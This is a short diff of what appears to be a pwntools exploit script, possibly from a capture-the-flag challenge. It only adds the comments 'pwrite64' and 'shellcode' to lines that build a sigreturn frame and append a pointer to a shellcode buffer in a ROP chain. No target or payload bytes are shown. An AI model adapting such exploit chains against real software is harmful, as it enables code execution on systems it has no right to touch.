@@ -88,8 +88,8 @@ f.rsp = off1 + len(s) + len(bytes(f))
 f.r14 = 0x0
 f.r15 = 0xf
 
-s += bytes(f)
-s += p64(off2 + buf2)
+s += bytes(f) #pwrite64
+s += p64(off2 + buf2) #shellcode
 
 log.info('Rop len: ' + hex(len(s)))
 
